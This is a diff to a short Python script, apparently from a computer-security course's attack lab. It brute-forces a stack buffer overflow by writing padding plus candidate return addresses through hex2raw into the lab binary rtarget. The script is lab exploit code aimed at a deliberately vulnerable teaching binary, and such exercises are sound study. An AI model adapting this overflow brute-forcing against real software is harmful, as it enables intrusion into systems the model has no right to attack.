@@ -2,14 +2,13 @@ import subprocess as sp
 import pdb
 
 for i in range(4201265,4201323):
-    pdb.set_trace()
     d = hex(i)[2:]
     output = " "
     for i in range(len(d),0,-2):
         output = output + d[i-2:i] + " "
 
     fill_buffer = ""
-    for i in range(56):
+    for i in range(1000):
         fill_buffer = fill_buffer + "00 "
     out_buffer = fill_buffer + output + "00 00 00 00"
 
@@ -19,8 +18,8 @@ for i in range(4201265,4201323):
 
  #   sp.call(["./hex2raw", "<", "exploit4.txt", "|", "./rtarget"], shell=True)
     with open("exploit4.txt") as inhandle:
-        p = sp.Popen("./hex2raw",stdin=inhandle,stdout=sp.PIPE)
-        p2 = sp.Popen("./rtarget",stdin=p.stdout,stdout=sp.PIPE)
+        p = sp.Popen("./hex2raw",stdin=inhandle,stdout=sp.PIPE, shell=True)
+        p2 = sp.Popen("./rtarget",stdin=p.stdout, shell=True)
         [output,error] = p2.communicate()
         rc2 = p2.wait()
         rc = p.wait()
